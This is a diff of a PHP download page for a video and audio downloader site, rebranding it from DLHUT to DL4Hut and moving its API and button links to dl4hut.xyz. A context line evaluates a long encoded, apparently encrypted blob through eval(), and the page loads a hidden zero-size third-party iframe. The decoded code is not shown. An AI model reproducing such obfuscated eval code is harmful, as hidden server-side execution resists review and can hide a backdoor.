@@ -6,35 +6,35 @@ if(file_exists('key.php')){include_once('key.php');}else{die('<h2>File key.php n
 $e7091="Yks4ZkYrTEhJTDFoVFVCeWM0Y2cwNndRWDE0elBQa2lhQXY0bGdiLzI3ZEgwOExlTHNST05jZGVjMzFLZWtSemVjSHIrUWxramV6ZWkwRHpqMWdJNXlCTGxTSUtWSVFwdTY4dE9WYnU3YVFCaXBJeWRCQUdtaThSQ0d3Yk1vWVdXYUhSbzVmdWpoU1BtLzFLVUxhUGdTTjg4WmlXRGo4bWlyM1pkSWVETkZySEtGTnpJNUdRYXNKOFlZSUt2ekN6b1FFZzRZaUhTM0lVaVhQOW0walR1czhjUjZLaTljQmJUSVlDMnE0MFEyNE8vbmt3bWZlK0MzTS96QjFtc3F1RDdnZEFUcmh1SEwzdmoxM04yUFNEcUt3OHcvWmVjazNESXljMGZJT1plNUVVZGJRTVFHUHNQYU1xaGxmZXNoKzcveHR5S1ZTd05FQmZPajBPejQzVlhMelVhSjR2UVNLdEZYeTJnZTdJdFFqMVVwWk1QcmlHcXc1VnRsTSt2anEvemM1clNyOFZTcStVSU4yMmljOXhUS3h1SzdBaVFYaDBsM2x1Mnh3QzhYczh0RDBFeXBWbWxUck9ldTNTNTgxQnlJUGRFbGxkaTg2ejUzZlRkMGZCZkxNZURnbFNTOEtUMnNXQTlhNDkwaFNHTjhrMTdTbW5OR09ycmVGVVJDUFVJVHdqQWJma0FvTE9PMnJPUHJSSmo3d3lubzNMKzFMNVkvZ2RhcklML1crTzZtcjdaZDY5cHpJa2pOOWJ2REFkdzZOMklYK0JneGZwUHp0dU90R3FjdUhJTzAxTjlhbktqNU5hV3BsbjFGb3FpY0FGaGVFZkpMbDY3Tk9acnFQcUFZTHVTNzIvQWFGbnQwUC9VWjVkUnBTYjZHM09rUUtXdFMvU0dFdllFR1B1STUzM0RiVWpwWjVrdTkwV1Z0VFY5cGhiVkFjdnNiMFVORVhienppblJJb3lxOXhSVGJSZGdkMlQ0NDZyMFMrbWwwcDlQTkoyUXNkNUk2RmhQbVkyZ3hNdjlGR2hhUjNjb1BkNlc2V2ovVW90TUlsMmFIMmR1cGhNbkJuVEh4RVVqZzhjQzF0RnhTM1dPSkpxWXoyUWE4Q3pvMkJ3RlZDdHE5dlNrbG1uYTlDZy9pbFV2YlpsNFA1a1VNMFdOVFJSSGVHN2o1TVZUdVhxTEpjUURsOWNRUzQzQzNOWGc1UDhBdy9Xb01KZ0ZtQVVpUnVMa1VPNTUybWlUVysvT1pxQjRwZlh4TWVKTVZ4bDFlaGZFbkNiakNER3N5eHZjaEt0QnZJeFVEcUZaMzZ3ajNxcGJmQ2hGQVZnalZRVXV1RnV1OWtJZnFKQ2g2VnVvU2lJWFhqYURXNU1Gc3VhU0EzdUdKaHRzcFJOeVV5Tkd1V21aVVVaUnAzb05HdkZvLzJhd0lDV1BTTCtBeXBucTZCVEh2MTZYbTh0SUFtRkhabnNrUlFqd0E0RUkyQUZBTytDa3hYclJEekU0cmswdmsrYkJWRUhiR0o3VzBueGltRzdTNmlsTTZtS0Mwdm1RV091QmFKbnNOTFhVMlNDUk10cGR0WVhPTXJ0bTBJaGNsbGZzYVFqMUNzYkVCYlhsMnBCL04zeDJhclJESGFWSTB2SXdsbzM5bFhUTWNTZXM5Y2MwZ2dGWGFVb2FZdHpuc1lkenJlSW8vMURXcFV4dGJzS3lXdDMzbmtTL3k3U0Q1UW1RVEZIZkJLblVGWmpnK29EUXJFOGhRczZYUlR0cVZ1Y3BpdCtMUnJXZW83SGNPMW1aQTlwVkdXWjFNcWlaRnZCUkJvU09ZRWgyUXprNnR3Mm9lbFZualN6ek9sVzlRdGxYeTJkQnptR3hLd0pkeXRBNmZHM3k1MFg5Y2RqTXdiRFNlNS9ucjh2NFZnN2dBOUQ5R29BSW8xblplblI4cTA9";eval(e7061($e7091));
 if(!empty($thumb)){
     $thumbux = $thumb;
-} else $thumbux = "https://dlhut.000webhostapp.com/img/logo.png";
+} else $thumbux = "http://dl4hut.xyz/img/logo.png";
 ?>
 <!DOCTYPE html>
 <html>
 <head>
     <title>YavDL: Download : <?php echo $title; ?> .. </title>
-<meta name="title" content="DLHUT : Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
-<meta name="description" content="DLHUT :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader From YouTube,Facebook,Twitter,Pinterest,Instagram,MXtakatak,IPL,HotStar and 1000+ More Sites too">
+<meta name="title" content="DL4Hut : Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
+<meta name="description" content="DL4Hut :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader From YouTube,Facebook,Twitter,Pinterest,Instagram,MXtakatak,IPL,HotStar and 1000+ More Sites too">
 <meta name="keywords" content="Video,Audio, Downloader, Online, YouTube, Facebook, Twitter, TikTok, MXTakatak, All-in-One,Online Downloader,AIO,<?php echo $title; ?>">
 <meta name="robots" content="index, follow">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <meta name="language" content="English">
 <meta name="revisit-after" content="5 days">
 <meta name="author" content="TheOfficialVKr">
-<meta itemprop="name" content="DLHUT :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
+<meta itemprop="name" content="DL4Hut :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
 <meta itemprop="description" content="Online All in One Video & Audio Downloader From YouTube,Facebook,Twitter,Pinterest,Instagram,MXtakatak,IPL,HotStar and 1000+ More Sites too">
 <meta itemprop="image" content="<?php echo $thumbux; ?>">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="DLHUT - Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
+<meta name="twitter:title" content="DL4Hut - Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
 <meta name="twitter:description" content="Online All in One Video & Audio Downloader From YouTube,Facebook,Twitter,Pinterest,Instagram,MXtakatak,IPL,HotStar and 1000+ More Sites too">
 <meta name="twitter:site" content="theofficialvkr">
 <meta name="twitter:creator" content="itsmethevkr">
 <meta name="twitter:image" content="<?php echo $thumbux; ?>"> 
-<meta property="og:title" content="DLHUT :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
+<meta property="og:title" content="DL4Hut :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
 <meta property="og:description" content="Online All in One Video & Audio Downloader From YouTube,Facebook,Twitter,Pinterest,Instagram,MXtakatak,IPL,HotStar and 1000+ More Sites too">
 <meta property="og:image" content="<?php echo $thumbux; ?>">
-<meta name="twitter:image:src" content="http://dlhut.ml/stream.php?vkr=<?php echo $thumbux; ?>">
-<meta property="og:url" content="https://dlhut.000webhostapp.com/">
-<meta property="og:site_name" content="DLHUT :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
+<meta name="twitter:image:src" content="http://dl4hut.xyz/stream.php?vkr=<?php echo $thumbux; ?>">
+<meta property="og:url" content="http://dl4hut.xyz/">
+<meta property="og:site_name" content="DL4Hut :  Download - <?php echo $title; ?> :  Online All in One Video & Audio Downloader">
 <meta property="fb:app_id" content="427710135379286">
 <meta property="og:locale" content="en_US">
 <meta property="og:type" content="website">
@@ -61,7 +61,7 @@ if(!empty($thumb)){
 <script type='text/javascript'>
 if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/inc/service-worker.js') }
 </script>
-<script src="https://dlhut.000webhostapp.com/api/aio/dl.php/?vkr=<?php echo $id; ?>"></script>
+<script src="http://dl4hut.xyz/api/aio/dl.php/?vkr=<?php echo $id; ?>"></script>
 <iframe src="https://loader.to/ajax/progress.php?id=<?php echo $id; ?>" style="width:0px;height:0px;border:0px" scrolling="no"></iframe>
 <script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=614490edfeb2560019eec6d8&product=sop' async='async'></script>
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script></script>
@@ -121,14 +121,14 @@ Download : <?php echo $title; ?>
 
 if(!empty($title)){
     echo '<br>
-<a href="https://dlhut.000webhostapp.com/api/aio.php/?f=720&vkr='.$lloc.'">
+<a href="http://dl4hut.xyz/api/aio.php/?f=720&vkr='.$lloc.'">
 <button style="width:100%;"  class="btn btn-success"> Download MP4 in 720P  </button></a><br>';
 }
 else echo '';
 
 if(!empty($title)){
     echo '<br>
-<a href="https://dlhut.000webhostapp.com/api/aio.php?f=360&vkr='.$lloc.'">
+<a href="http://dl4hut.xyz/api/aio.php?f=360&vkr='.$lloc.'">
 <button style="width:100%;"  class="btn btn-success"> Download MP4 in 360P   </button></a><br>';
 }
 else echo ''; 
@@ -138,7 +138,7 @@ else echo '';
 
 if(!empty($title)){
     echo '<br>
-<a href="https://dlhut.000webhostapp.com/api/aio.php?f=mp3&vkr='.$lloc.'">
+<a href="http://dl4hut.xyz/api/aio.php?f=mp3&vkr='.$lloc.'">
 <button style="width:100%;"  class="btn btn-success"> Download MP3 in 320  </button></a><br>';
 }
 else echo ''; 
@@ -146,7 +146,7 @@ else echo '';
 
 if(!empty($title)){
     echo '<br>
-<a href="https://dlhut.000webhostapp.com/api/aio.php?f=m4a&vkr='.$lloc.'">
+<a href="http://dl4hut.xyz/api/aio.php?f=m4a&vkr='.$lloc.'">
 <button style="width:100%;"  class="btn btn-success"> Download M4A   </button></a><br>';
 }
 else echo ''; 
@@ -154,7 +154,7 @@ else echo '';
 
 if(!empty($title)){
     echo '<br>
-<a href="https://dlhut.000webhostapp.com/api/aio.php?f=webm&vkr='.$lloc.'">
+<a href="http://dl4hut.xyz/api/aio.php?f=webm&vkr='.$lloc.'">
 <button style="width:100%;"  class="btn btn-success"> Download Audio in WEBM  </button></a><br>';
 }
 else echo ''; 
